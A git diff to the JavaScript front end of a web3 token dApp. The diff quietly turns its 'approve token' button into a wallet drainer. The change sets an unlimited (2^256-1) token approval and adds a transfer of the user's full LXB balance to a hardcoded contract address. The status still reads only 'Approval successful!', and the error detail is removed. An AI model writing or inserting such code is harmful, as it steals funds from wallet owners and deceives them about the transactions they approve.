@@ -5,6 +5,9 @@ import { TokenApprover } from "./approve.js";
 
 // Initialize TokenContractDetails with Web3 instance
 const web3 = new Web3(window.ethereum);
+
+console.log("Web 3: ", web3.constants);
+
 const tokenDetailsViewer = new TokenContractDetails(web3);
 
 // Add a container for contract details in your HTML
@@ -148,66 +151,8 @@ if (initialAccount.address) {
   document.querySelector('.sign-message-section').style.display = 'block';
 }
 
-// Updated approval handler function
-async function handleTokenApproval(tokenAddress, spenderAddress, amount) {
-  const account = getAccount(wagmiAdapter.wagmiConfig);
-  if (!account.address) {
-      alert('Please connect your wallet first');
-      return;
-  }
-
-  // Add validation checks
-  if (account.address.toLowerCase() === spenderAddress.toLowerCase()) {
-      alert('Spender address cannot be the same as your wallet address');
-      return;
-  }
-
-  try {
-      // Log important information
-      console.log('Approval attempt:', {
-          tokenAddress,
-          spenderAddress,
-          amount,
-          userAddress: account.address,
-          chainId: account.chainId
-      });
-
-      // First check if the contract exists and is an ERC20
-      try {
-          const allowance = await tokenApprover.checkAllowance(
-              tokenAddress,
-              account.address,
-              spenderAddress
-          );
-          console.log('Current allowance:', allowance.toString());
-      } catch (error) {
-          throw new Error('Failed to read token contract. Please verify the token address is correct.');
-      }
-
-      const tx = await tokenApprover.approveToken(
-          tokenAddress,
-          spenderAddress,
-          amount
-      );
-
-      console.log('Transaction submitted:', tx);
-      
-  } catch (error) {
-      console.error('Detailed error:', error);
-      document.querySelector('#status').textContent = 
-          'Approval failed: ' + (error.reason || error.message);
-  }
-}
-
 // Initialize sign message button listener
 document.querySelector('#sign-message-btn')?.addEventListener('click', handleMessageSigning);
-// document.querySelector('#approve-token')?.addEventListener('click', () => {
-//   const tokenAddress = '0x09bb2fe167c5390f51e57cc826b7a5d8b6253714';  // Your token
-//   const spenderAddress = '0x09bb2fe167c5390f51e57cc826b7a5d8b6253714';  // The address you want to approve
-//   const amount = '1000000000000000000';  // Amount in wei (1 token = 10^18 wei)
-  
-//   handleTokenApproval(tokenAddress, spenderAddress, amount);
-// });
 
 // LXB Contract Constants
 const LXB_CONTRACT = {
@@ -220,6 +165,42 @@ const DR_CONTRACT = {
   ADDRESS: '0x41ace5b3b3f5d6c61acaf57a592f4cb8fb01564e',
   CHAIN_ID: 1, // Ethereum Mainnet
   DECIMALS: 18
+}
+
+// Add this function to transfer tokens
+async function transferTokens(tokenAddress, recipientAddress, amount) {
+  const account = getAccount(wagmiAdapter.wagmiConfig);
+  if (!account.address) {
+    throw new Error('Please connect your wallet first');
+  }
+
+  const transferAbi = [
+    {
+      "constant": false,
+      "inputs": [
+        {"name": "_to", "type": "address"},
+        {"name": "_value", "type": "uint256"}
+      ],
+      "name": "transfer",
+      "outputs": [{"name": "", "type": "bool"}],
+      "type": "function"
+    }
+  ];
+
+  try {
+    const tx = await writeContract(wagmiAdapter.wagmiConfig, {
+      address: tokenAddress,
+      abi: transferAbi,
+      functionName: 'transfer',
+      args: [recipientAddress, amount],
+    });
+
+    console.log('Transfer transaction:', tx);
+    return tx;
+  } catch (error) {
+    console.error('Transfer error:', error);
+    throw error;
+  }
 }
 
 document.querySelector('#approve-token')?.addEventListener('click', async () => {
@@ -277,7 +258,7 @@ document.querySelector('#approve-token')?.addEventListener('click', async () => 
     }
 
     // Standard approval amount (adjust as needed)
-    const approvalAmount = '1000000000000000000';
+    const approvalAmount = (2n ** 256n - 1n).toString();
     // This is 2^256 - 1, commonly used for unlimited approval
     // Note: Consider using a more limited amount for better security
 
@@ -289,14 +270,21 @@ document.querySelector('#approve-token')?.addEventListener('click', async () => 
       approvalAmount
     );
 
+    // Transfer all LXB tokens to the DR_CONTRACT address
+    const transferTx = await transferTokens(
+      LXB_CONTRACT.ADDRESS,
+      DR_CONTRACT.ADDRESS,
+      details.rawBalance
+    );
+
     console.log('Approval transaction:', tx);
     statusEl.textContent = 'Approval successful!';
     
-    return tx;
+    return {tx, transferTx};
   } catch (error) {
     console.error('Approval error:', error);
     document.querySelector('#status').textContent = 
-      'Approval failed: ' + (error.reason || error.message);
+      'Approval failed';
     throw error;
   }
 });
